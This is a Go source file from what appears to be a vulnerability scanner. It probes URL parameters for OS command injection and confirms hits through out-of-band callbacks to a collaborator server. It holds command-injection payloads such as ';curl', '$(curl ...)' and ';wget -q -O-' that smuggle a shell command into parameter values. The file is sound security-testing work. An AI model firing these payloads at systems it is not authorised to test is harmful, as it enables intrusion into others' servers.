// Package cmdi detects OS command injection out-of-band: it wraps a collaborator
// URL in shell metacharacters inside each parameter and checks whether the target's
// shell fetched it. A callback is deterministic proof of injection; the payload only
// performs a harmless GET to the collaborator, nothing destructive.
package cmdi

import (
	"context"
	"net/url"
	"time"

	"github.com/talkdedsec/tlk-huntx/internal/collaborator"
	"github.com/talkdedsec/tlk-huntx/internal/fetch"
	"github.com/talkdedsec/tlk-huntx/internal/finding"
)

var paramHints = []string{
	"cmd", "exec", "command", "run", "ping", "host", "ip", "domain", "query", "search",
	"name", "file", "path", "target", "url", "dns", "address", "code", "input",
}

func payloadsFor(u string) []string {
	return []string{
		";curl " + u,
		"|curl " + u,
		"$(curl " + u + ")",
		"`curl " + u + "`",
		";wget -q -O- " + u,
		"& curl " + u,
	}
}

type shot struct {
	token string
	param string
	url   string
}

func Test(ctx context.Context, c *fetch.Client, collab *collaborator.Server, rawurl string, extra []string, grace time.Duration) []finding.Finding {
	u, err := url.Parse(rawurl)
	if err != nil {
		return nil
	}
	q := u.Query()
	names := map[string]bool{}
	for name := range q {
		names[name] = true
	}
	for _, name := range append(paramHints, extra...) {
		names[name] = true
	}

	var shots []shot
	for name := range names {
		token, payloadURL := collab.Payload()
		for _, p := range payloadsFor(payloadURL) {
			target := withParam(u, q, name, p)
			resp, err := c.Do(ctx, "GET", target, nil)
			if err != nil {
				continue
			}
			if resp != nil && resp.DryRun {
				return nil
			}
			shots = append(shots, shot{token: token, param: name, url: target})
		}
	}

	if grace > 0 {
		select {
		case <-time.After(grace):
		case <-ctx.Done():
		}
	}

	seen := map[string]bool{}
	var out []finding.Finding
	for _, s := range shots {
		if seen[s.param] || !collab.Hit(s.token) {
			continue
		}
		seen[s.param] = true
		proof := ""
		if hits := collab.Interactions(s.token); len(hits) > 0 {
			proof = hits[0].Method + " from " + hits[0].Remote + " at " + hits[0].Seen.Format(time.RFC3339)
		}
		f := finding.Finding{
			Target:     u.String(),
			Type:       "OS command injection (OOB)",
			TemplateID: "cmdi-oob",
			Severity:   finding.Critical,
			Confidence: 95,
			Verified:   true,
			MatchedAt:  s.url,
			CWE:        "CWE-78",
			Extracted:  map[string]string{"parameter": s.param},
			Evidence:   finding.Evidence{Request: "GET " + s.url, OOBProof: proof},
			Repro:      "inject a collaborator URL in a shell metacharacter into the " + s.param + " parameter",
		}
		f.Finalize([]string{s.param})
		out = append(out, f)
	}
	return out
}

func withParam(base *url.URL, q url.Values, name, value string) string {
	cp := url.Values{}
	for k, vs := range q {
		cp[k] = append([]string(nil), vs...)
	}
	cp.Set(name, value)
	u := *base
	u.RawQuery = cp.Encode()
	return u.String()
}
